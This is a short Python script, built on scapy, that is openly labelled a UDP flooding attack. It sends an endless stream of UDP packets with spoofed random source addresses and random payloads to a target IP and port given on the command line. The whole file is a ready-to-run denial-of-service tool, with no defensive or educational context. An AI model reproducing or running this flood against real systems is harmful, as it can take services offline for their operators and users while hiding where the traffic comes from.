from scapy.all import *
import sys
import random
import string

class UDPAttacker:
    '''
    UDP Flooding Attack
    '''

    def attack(self, victim_ip, victim_port):
        while True:
            a, b, c, d, port = random.randint(100, 255), random.randint(100, 255), random.randint(100, 255), \
                               random.randint(100, 255), random.randint(1024, 60000)
            src_ip = f'{a}.{b}.{c}.{d}'
            ip_layer = IP(src=src_ip, dst=victim_ip)
            udp_layer = UDP(sport=port, dport=victim_port)
            random_length = random.randint(1000, 1500)
            payload = ''.join([random.choice(string.digits + string.ascii_letters) for i in range(random_length)])
            packet = ip_layer / udp_layer / payload
            print(packet)
            send(packet)


if __name__ == "__main__":
    target_ip, target_port = sys.argv[1], sys.argv[2]
    attacker = UDPAttacker()
    attacker.attack(target_ip, int(target_port))

